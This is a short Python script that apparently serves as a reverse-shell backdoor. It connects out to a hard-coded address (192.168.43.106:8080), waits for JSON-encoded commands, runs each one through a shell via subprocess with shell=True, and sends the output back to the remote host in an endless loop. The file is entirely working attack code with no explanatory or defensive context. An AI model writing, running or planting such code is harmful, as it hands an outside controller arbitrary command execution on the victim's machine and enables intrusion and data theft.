import socket
import subprocess
import json

class mySocket:
	def __init__(self, ip, port):
		self.myConnection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.myConnection.connect((ip,port))

	def json_send(self,data):
		json_data = json.dumps(data)
		self.myConnection.send(json_data)

	def json_recieve(self):
		json_data = self.myConnection.recv(1024)
		return json.loads(json_data)
	
	def command_execution(self,command):
		return subprocess.check_output(command, shell=True)

	def startSocket(self):
		while True:
			command = self.json_recieve()
			commandOutput = self.command_execution(command)
			self.json_send(commandOutput)
		self.myConnection.close()

my_socketObj = mySocket("192.168.43.106",8080)
my_socketObj.startSocket()